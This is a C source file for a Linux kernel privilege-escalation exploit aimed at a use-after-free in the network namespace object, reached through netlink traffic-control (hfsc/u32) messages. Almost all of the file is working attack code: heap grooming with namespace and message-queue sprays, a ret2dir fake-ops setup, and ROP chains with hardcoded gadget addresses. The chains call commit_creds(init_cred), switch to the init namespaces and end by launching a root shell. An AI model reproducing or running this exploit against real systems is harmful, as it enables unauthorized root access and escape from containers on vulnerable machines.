#define _GNU_SOURCE

#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <assert.h>
#include <stdarg.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/nsfs.h>
#include "libexp.h"

#define SPRAY_NUM1 10
#define SPRAY_NUM2 10
#define SPRAY_NUM3 0x30
#define u64 unsigned long long
#define u32 unsigned int
#define unlikely(x)	__builtin_expect(!!(x), 0)
#define CRASH_ADDR 0xffffffffdeadbeef

u64 kernel_base = 0;
u64 slide = 0;
u64 kfree_ptr = 0xffffffff832b3218; // ext4_feat_ktype
int *success, *crash;
char *self_path;
pid_t pids1[SPRAY_NUM1];
pid_t pids2[SPRAY_NUM2];
pid_t pids3[SPRAY_NUM3];
unsigned long long user_ss, user_sp, user_rflags, user_rip, user_cs;
void *ret2dir_payload;
u64 kptr = 0;

void shell(void)
{
	printf("uid: %d\n", getuid());
	system("/bin/bash");
}

void setup_sandbox2(void)
{
    int real_uid = getuid();
    int real_gid = getgid();

    assert(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWPID) == 0);
    assert(write_file("/proc/self/setgroups", "deny") >= 0);
    assert(write_file("/proc/self/uid_map", "0 %d 1\n", real_uid) >= 0);
    assert(write_file("/proc/self/gid_map", "0 %d 1\n", real_gid) >= 0);
}

void *build_pkt(struct nlmsghdr *hdr, struct tcmsg *tcmsg, void *attrs, int attr_len)
{
	// netlink packet, from /usr/include/linux/netlink.h
	/*
	 *  <------- NLA_HDRLEN ------> <-- NLA_ALIGN(payload)-->
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 * |		Header	   | Pad |	 Payload	   | Pad |
	 * |   (struct nlattr)   | ing |				   | ing |
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 *  <-------------- nlattr->nla_len -------------->
	 */

	// struct nlattr {
	// 	__u16		   nla_len;
	// 	__u16		   nla_type;
	// };

	// traffic control policy
	// const struct nla_policy rtm_tca_policy[TCA_MAX + 1] = {
	// 	[TCA_KIND]		= { .type = NLA_STRING },
	// 	[TCA_RATE]		= { .type = NLA_BINARY,
	// 					.len = sizeof(struct tc_estimator) },
	// 	[TCA_STAB]		= { .type = NLA_NESTED },
	// 	[TCA_DUMP_INVISIBLE]	= { .type = NLA_FLAG },
	// 	[TCA_CHAIN]		= { .type = NLA_U32 },
	// 	[TCA_INGRESS_BLOCK]	= { .type = NLA_U32 },
	// 	[TCA_EGRESS_BLOCK]	= { .type = NLA_U32 },
	// };
	//
	// struct tcmsg {
	// 	unsigned char	tcm_family;
	// 	unsigned char	tcm__pad1;
	// 	unsigned short	tcm__pad2;
	// 	int				tcm_ifindex;
	// 	__u32			tcm_handle;
	// 	__u32			tcm_parent;
	// 	__u32			tcm_info;
	// };
	//
	// struct nlmsghdr {
	//	 __u32 nlmsg_len;// = 0x38;
	//	 __u16 nlmsg_type;// = 0x24??? RTM_NEWQDISC, creating a new qdisc scheduler
	//	 __u16 nlmsg_flags;// = 0x401 NLM_F_REQUEST(0x1)|NLM_F_CREATE(0x400)
	//	 __u32 nlmsg_seq;// = NL_AUTO_SEQ
	//	 __u32 nlmsg_pid;// = NL_AUTO_PID
	// };
	//
	//
	//enum {
	//	TCA_U32_UNSPEC,
	//	TCA_U32_CLASSID,
	//	TCA_U32_HASH,
	//	TCA_U32_LINK,
	//	TCA_U32_DIVISOR,
	//	TCA_U32_SEL,
	//	TCA_U32_POLICE,
	//	TCA_U32_ACT,
	//	TCA_U32_INDEV,
	//	TCA_U32_PCNT,
	//	TCA_U32_MARK,
	//	TCA_U32_FLAGS,
	//	TCA_U32_PAD,
	//	__TCA_U32_MAX
	//};
	// struct nla_policy u32_policy[TCA_U32_MAX + 1] = {
	//	[TCA_U32_CLASSID]	= { .type = NLA_U32 },
	//	[TCA_U32_HASH]		= { .type = NLA_U32 },
	//	[TCA_U32_LINK]		= { .type = NLA_U32 },
	//	[TCA_U32_DIVISOR]	= { .type = NLA_U32 },
	//	[TCA_U32_SEL]		= { .len = sizeof(struct tc_u32_sel) },
	//	[TCA_U32_INDEV]		= { .type = NLA_STRING, .len = IFNAMSIZ },
	//	[TCA_U32_MARK]		= { .len = sizeof(struct tc_u32_mark) },
	//	[TCA_U32_FLAGS]		= { .type = NLA_U32 },
	//};

	void *payload = calloc(1, 0x1000);
	void *ptr = payload;
	hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct tcmsg) + attr_len;
	// printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
	// printf("attr_len: %#x\n", attr_len);

	memcpy(ptr, hdr, sizeof(struct nlmsghdr));
	ptr += sizeof(struct nlmsghdr);
	memcpy(ptr, tcmsg, sizeof(struct tcmsg));
	ptr += sizeof(struct tcmsg);
	memcpy(ptr, attrs, attr_len);
	return payload;
}

void net_spray1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids1[i] = pid;
	}
	usleep(500000);
}

void net_spray2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids2[i] = pid;
	}
	usleep(500000);
}

void net_spray3()
{
	for(int i=0; i<SPRAY_NUM3; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids3[i] = pid;
	}
	usleep(500000);
}
void net_defragment(int num)
{
	for(int i=0; i<num; i++) {
		if(!clean_fork()) {
			if (unshare(CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
	}
	usleep(500000);
	// sleep(1);
}

void net_release1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		int ret = kill(pids1[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		int ret = kill(pids2[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release3(int full)
{
	int jump;
	if(full) jump = 1;
	else jump = 2;
	// we don't free all struct net so we don't discard slab
	for(int i=0; i<SPRAY_NUM3; i+=jump) {
		int ret = kill(pids3[i], SIGKILL);
		if(!full) assert(ret == 0);
	}
}

struct msg_spray_t *msg_spray_once(void *payload, size_t msg_size, u32 num)
{
	int msgqid;
	char *buf;

	// create the message queue id first
	msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// do spray
	int ret;
	for(int i=0; i<num; i++) {
		ret = msgsnd(msgqid, payload, msg_size, IPC_NOWAIT);
		assert(ret >= 0);
	}

	// return info about this spray
	struct msg_spray_t *spray = malloc(sizeof(struct msg_spray_t));
	spray->next = NULL;
	spray->msgqid = msgqid;
	spray->payload = payload;
	spray->len = msg_size;
	spray->num = num;
	return spray;
}

int get_inum()
{
	int i;
	char buf[0x200];
	memset(buf, 0, sizeof(buf));

	// reference: function ns_get_name
	ssize_t ret = readlink("/proc/self/ns/net", buf, sizeof(buf));
	assert(ret >= 0);
	for(i=0; i<ret; i++) {
		if(buf[i] == '[') break;
	}
	assert(buf[i] == '[');

	return atoi(&buf[i+1]);
}

int identify_msg(struct msg_spray_t *spray)
{
	int ret;
	int inum;
	void *payload = malloc(spray->len+0x10);
	void *buffer = malloc(spray->len+0x10);
	struct msg_spray_t *new_spray;
	int *ptr = (int *)(payload+8);

	// taint payload
	memset(payload, 'A', 8);
	for(int i=0; i<(spray->len-8)/sizeof(*ptr); i++) {
		ptr[i] = i+8; // so ptr[i] != 4
	}

	int found = 0;

	while(!found && spray) {
		for(int i=0; i<spray->num; i++) {
			// free the message
			ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
			// printf("ret: %d\n", ret);
			assert(ret >= 0);

			// occupy the slot
			new_spray = msg_spray_once(payload, spray->len, 1);
			inum = get_inum();
			// printf("inum: %#x\n", inum);
			if(inum != 0x41414141) {
				found = 1;
				break;
			}
		}

		spray = spray->next;
	}
	if(!found) {
		puts("spray debug");
		getchar();
	}
	assert(found == 1);
	return new_spray->msgqid;
}

void *prepare_payload(char *payload)
{
	//0xffffffff8110f72a: push rax; call qword ptr [rax]
	//0xffffffff81c0326d: push rdi; push rcx; jmp qword ptr [rax-0x13];
	//0xffffffff81c03b6e: pop rsi; jmp qword ptr [rax-0x1c];
	//0xffffffff81381951: pop rbx; jmp qword ptr [rdi];
	//0xffffffff81c0874c: pop rdx; rcr dh, cl; jmp qword ptr [rdi+0x40];
	//0xffffffff81c03bce: pop rsi; inc dword ptr [rax]; in al, 0x46; call qword ptr [rdi-0xc];

	// pivot stack without clobbering rbp
	*(long *)&payload[0x20] = slide + 0xffffffff8110f72a;//: push rax; call qword ptr [rax]
	*(long *)&payload[0] = slide + 0xffffffff81c0874c;//: pop rdx; rcr dh, cl; jmp qword ptr [rdi+0x40];

	// actual rop chain
	*(long *)&payload[8] = slide + 0xffffffff8102468a;//: pop rsi; pop rdx; pop rcx; ret;

	long buffer = slide + 0xffffffff82218000;
	long *rop = &payload[0x28];
	int idx = 0;

	// save rbp+0x140
	rop[idx++] = 0xffffffff81795015;//: enter 0, 0; pop rbx; pop r14; pop rbp; ret;
	rop[idx++] = buffer;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xffffffff8102a31e;//: pop rax; ret;
	rop[idx++] = 0x140;
	rop[idx++] = 0xffffffff814126d2;//: add rax, rbx; pop rbx; pop rbp; ret;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xffffffff8191ff07;//: mov [r14], rax; mov eax, ebx; pop rbx; pop r14; pop rbp; ret;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;

	// escalate privilege
    rop[idx++] = slide + 0xffffffff81060df5; //: pop rdi; ret;
    rop[idx++] = slide + 0xffffffff824560c0; // init_cred
    rop[idx++] = slide + 0xffffffff810b26f0; // T commit_creds

	// switch namespace for itself (to get rid of the broken net namespace)
    rop[idx++] = slide + 0xffffffff81060df5; //: pop rdi; ret;
    rop[idx++] = getpid();
    rop[idx++] = slide + 0xffffffff810a9d80; // find_task_by_vpid
	rop[idx++] = slide + 0xffffffff818b39a2;//: mov rcx, rax; xor eax, eax; test rcx, rcx; setne al; pop rbp; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8107b67f;//: pop r15; ret;
    rop[idx++] = buffer + 8;
	rop[idx++] = slide + 0xffffffff81075fef;//: mov rdi, rcx; mov [r15+0x30], rdi; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff810a2b1e; //: pop rsi; ret;
    rop[idx++] = slide + 0xffffffff82455cf0; // init_nsproxy
    rop[idx++] = slide + 0xffffffff810b0b20; // switch_task_namespaces

	// switch namespace for pid 1
    rop[idx++] = slide + 0xffffffff81060df5; //: pop rdi; ret;
    rop[idx++] = 1;
    rop[idx++] = slide + 0xffffffff810a9d80; // find_task_by_vpid
	rop[idx++] = slide + 0xffffffff818b39a2;//: mov rcx, rax; xor eax, eax; test rcx, rcx; setne al; pop rbp; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff8107b67f;//: pop r15; ret;
    rop[idx++] = buffer + 8;
	rop[idx++] = slide + 0xffffffff81075fef;//: mov rdi, rcx; mov [r15+0x30], rdi; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret;
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = 0; // padding
    rop[idx++] = slide + 0xffffffff810a2b1e; //: pop rsi; ret;
    rop[idx++] = slide + 0xffffffff82455cf0; // init_nsproxy
    rop[idx++] = slide + 0xffffffff810b0b20; // switch_task_namespaces

	// return execution
    rop[idx++] = slide + 0xffffffff81000571; // : pop rbp ; ret
    rop[idx++] = buffer + 0x10;
    rop[idx++] = slide + 0xffffffff812540fd; //: push qword ptr [rbp-0x10]; pop rbp; ret;
    rop[idx++] = slide + 0xffffffff8107b5ec; //: mov rsp, rbp; pop rbp; ret;
}

void prepare_ropchain(u64 *rop, u64 buffer)
{
	int idx = 0;

    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
    rop[idx++] = 0xdeadbeef;
	rop[idx++] = slide + 0xffffffff8157f35f;//: pop rsp; pop rbx; ret;

	// save rbp+0x140 to buffer

    // rop[idx++] = slide + 0xffffffff816fa405; // enter 0,0; pop rbx; pop r14; pop rbp; ret
    // rop[idx++] = 0xdeadbeef;
    // rop[idx++] = 0xdeadbeef;
	// rop[idx++] = slide + 0xffffffff8102c2c1;// : pop rax ; ret
	// rop[idx++] = 0x140;
	// rop[idx++] = slide + 0xffffffff81205e83; // : add rbx, rax ; mov rax, rbx ; pop rbx ; pop r14 ; pop rbp ; ret
    // rop[idx++] = 0xdeadbeef;
    // rop[idx++] = buffer-0x108;
    // rop[idx++] = 0xdeadbeef;
	// rop[idx++] = slide + 0xffffffff81166890; // : mov qword ptr [r14 + 0x108], rax ; xor eax, eax ; pop rbx ; pop r14 ; pop rbp ; ret
    // rop[idx++] = 0xdeadbeef;
    // rop[idx++] = 0xdeadbeef;
    // rop[idx++] = 0xdeadbeef;

	// // escalate privilege
    // rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    // rop[idx++] = slide + 0xffffffff82250950; // init_cred
    // rop[idx++] = slide + 0xffffffff8109ed70; // commit_creds

	// // switch namespace for itself (to get rid of the broken net namespace)
    // rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    // rop[idx++] = getpid();
    // rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
    // rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
    // rop[idx++] = 1;
    // rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
    // rop[idx++] = 0; // padding
    // rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
    // rop[idx++] = 0; // padding
    // rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
    // rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
    // rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// // switch namespace for pid 1
    // rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
    // rop[idx++] = 1;
    // rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
    // rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
    // rop[idx++] = 1;
    // rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
    // rop[idx++] = 0; // padding
    // rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
    // rop[idx++] = 0; // padding
    // rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
    // rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
    // rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// // return execution
    // rop[idx++] = slide + 0xffffffff81000571; // : pop rbp ; ret
    // rop[idx++] = buffer + 0x10;
    // rop[idx++] = slide + 0xffffffff8123e2cd; // : push qword ptr [rbp - 0x10] ; pop rbp ; ret
    // rop[idx++] = slide + 0xffffffff810679cc; // : mov rsp, rbp ; pop rbp ; ret
}

void exploit(void)
{
	puts("Stage 2: trigger vulnerability");
	printf("self path: %s\n", self_path);
	int ns_fd = open("/proc/self/ns/net", 0);
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	int self_fd = open(self_path, 0);
	assert(self_fd >= 0);

	// include uapi/linux/rtnetlink.h	
	// send the first nlmsg pkt to create qdisc
	// triggers rtnetlink_rcv_msg->tc_modify_qdisc // queue discipline
	//
	//
	// from net/sched/sch_api.c
   	// qdisc's are divided to two categories:
   	// - "queues", which have no internal structure visible from outside.
   	// - "schedulers", which split all the packets to "traffic classes",
   	//   using "packet classifiers" (look at cls_api.c)
   	// In turn, classes may have child qdiscs (as rule, queues)
   	// attached to them etc. etc. etc.
	// 
	// SO hfsc is a qdisc and u32 is a classifier
	//
	//
	//
	// send first packet to create a new qdisc
	struct nlmsghdr nlmsghdr = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWQDISC, // 0x24
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = TC_H_ROOT, // 0xffffffff
							.tcm_info = 0};
	char attrs1[] =	"\x0c\x00""\x01\x00""hfsc\x00\x00\x00\x00"
					"\x08\x00""\x02\x00""\x00\x00\x00\x00";
	int attr_len1 = sizeof(attrs1) - 1; // minus the trailing null byte
	void *pkt = build_pkt(&nlmsghdr, &tcmsg, attrs1, attr_len1);

	send(sk, pkt, nlmsghdr.nlmsg_len, MSG_DONTWAIT);

	// send the second nlmsg pkt to successfully trigger tc_new_tfilter
	struct nlmsghdr nlmsghdr2 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER, // 0x2c
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg2 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs2[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x18\x00""\x02\x00" // NESTED
						"\x14\x00""\x05\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";// TCA_U32_SEL
	int attr_len2 = sizeof(attrs2) - 1; // minus the trailing null byte
	void *pkt2 = build_pkt(&nlmsghdr2, &tcmsg2, attrs2, attr_len2);

	send(sk, pkt2, nlmsghdr2.nlmsg_len, MSG_DONTWAIT);

	// send the third nlmsg pkt to fail tc_new_tfilter
	//
	// u32 handler: xxx yy zzz
	// xxx: HTID, yy: HASH, zzz: NODE
	// yyzzz: KEY
	struct nlmsghdr nlmsghdr3 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER,
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg3 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0x80000800, // HTID: 0x800, HASH: 0, NODE: 0x800, KEY:0x00800
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs3[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x0c\x00""\x02\x00" // NESTED
						"\x08\x00""\x06\x00""\x00\x00\x00\x00";// TCA_U32_POLICE
	int attr_len3 = sizeof(attrs3) - 1; // minus the trailing null byte
	void *pkt3 = build_pkt(&nlmsghdr3, &tcmsg3, attrs3, attr_len3);

	// decrease struct net refcount to 1
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);

	// clear other objects in the same cache as our victim object
	// the target slab will be added to cpu_partial
	puts("Stage 3: reclaim object");
	net_release1();
	net_release2();
	sleep(1);

	// force the kernel to drain cpu_partial
	net_release3(0);

	// wait for everything to happen
	sleep(1);
	// puts("hey!");
	// getchar();

	// now decrease struct net refcount to 0 and wait for the object release and final discard_slab	
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	sleep(1);

	// try to reclaim the page!
	int msg_size = 0xff8-0x30;
	void *payload = malloc(msg_size+0x10);
	memset(payload, 0x41, 8); // make sure it is a valid message
	long *ptr = (long *)(payload+8);
	// taint messege, if struct net is aligned with msg_msg,
	// we will know according to the leaked value
	for(int i=0; i<(msg_size-8)/8; i++) {
		ptr[i] = 0x4141414141414141;
	}
	struct msg_spray_t *spray = msg_spray(payload, msg_size, 0x1000);
	int inum = get_inum();
	printf("inum: %#x\n", inum);
	assert(inum == 0x41414141);

	// now we need to carefully identify the messege that overlaps with the struct net
	// and calculate the offset of struct net inside the messege
	int msgqid = identify_msg(spray);
	int offset = get_inum()*4;
	printf("offset: %#x\n", offset);

	// now overwrite ns
	char buffer1[0x2000];
	char *kfree_payload = malloc(0x2000);
	memset(kfree_payload, 0x41, 0x2000);
	long *fake_ns = (long *)&kfree_payload[offset-0x30+8];
	fake_ns[0x0/8] = 0;
	fake_ns[0x8/8] = kptr; // set net->ns->ops
	fake_ns[0x10/8] = 0x41414141; // set net->ns->inum == 0x41414141

	msgrcv(msgqid, buffer1, sizeof(buffer1), 0, MSG_NOERROR | IPC_NOWAIT);
	struct msg_spray_t *spray1 = msg_spray_once(kfree_payload, 0xff8-0x30, 1);
	assert(get_inum() == 0x41414141);

	// trigger payload
	puts("Before ioctl payload");
	//getchar();
	ioctl(ns_fd, NS_GET_PARENT, 0x4242424242424242);

	// puts("Before triggering payload");
	// getchar();
	// close(ns_fd);

	// puts("Done!");
	// getchar();
	exit(0);
}

void handle_sig(int sig)
{
	printf("Caught signal %d\n", sig);
	puts("sleep!");
	net_release3(1);
	*crash = 1;
	sleep(10000);
}

void attempt(void)
{
	signal(SIGABRT, handle_sig);
	// signal(SIGSEGV, shell);
	set_cpu(0);

	puts("Stage 1: prepare heap layout");
	// first, defragment net_namespace
	puts("1");
	net_defragment(0x40);

	// second, spray more struct net for later unfreezing
	puts("2");
	net_spray3();

	// third, surround the target struct net with controlled struct net
	puts("3");
	net_spray1();
	setup_sandbox2();
	net_spray2();
	net_defragment(0x10);

	// puts("sandbox up!");
	// getchar();
	exploit();
	puts("Execution ended!");
	// net_spray3();
	// net_release3();

	// sleep(1000);
}

int main(int argc, char **argv)
{
	ret2dir_payload = umem_alloc(NULL, 0x1000);
	memset(ret2dir_payload, 'C', 0x100);
	((long *)ret2dir_payload)[4] = CRASH_ADDR;// ops->put
	((long *)ret2dir_payload)[7] = CRASH_ADDR;// ops->get_parent
	kptr = ret2dir_setup(ret2dir_payload, 0xffff888000000000);
	printf("kptr: %#llx\n", kptr);

	crash = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
	success = crash + 1;
	*success = 0;
	self_path = success + 1;
	strcpy(self_path, argv[0]);
	while(*success == 0) {
		*crash = 0;
		if(!fork()) {
			puts("attempt!!");
			attempt();
		}
		while(*crash == 0 && *success == 0) {
			usleep(100000);
		}
		sleep(3);// give it some time to clean up memory
	}
	puts("Launch shell!");
	// system("/bin/bash");
	system(self_path);
	sleep(100000);
}

